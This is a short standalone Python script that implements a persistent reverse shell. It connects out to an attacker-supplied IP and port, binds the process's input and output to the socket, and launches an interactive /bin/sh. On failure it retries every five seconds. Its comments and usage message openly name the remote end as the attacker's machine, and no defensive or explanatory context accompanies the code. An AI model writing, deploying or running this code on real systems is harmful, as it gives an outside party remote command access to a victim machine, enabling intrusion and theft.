import socket
import subprocess
import os
import sys
import time

def reverse_shell(ip, port):
    while True:
        try:
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to the attacker's machine
            print(f"[*] Connecting to {ip}:{port}...")
            s.connect((ip, port))
            print("[+] Connection established!")
            
            # Redirect stdin, stdout, and stderr to the socket
            os.dup2(s.fileno(), 0)  # stdin
            os.dup2(s.fileno(), 1)  # stdout
            os.dup2(s.fileno(), 2)  # stderr
            
            # Start an interactive shell
            subprocess.call(["/bin/sh", "-i"])
        except socket.error as e:
            # If the connection fails, retry after 5 seconds
            print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Error: {e}")
            break
        finally:
            s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ATTACKER_IP> <ATTACKER_PORT>")
        sys.exit(1)
    
    attacker_ip = sys.argv[1]
    attacker_port = int(sys.argv[2])
    
    reverse_shell(attacker_ip, attacker_port)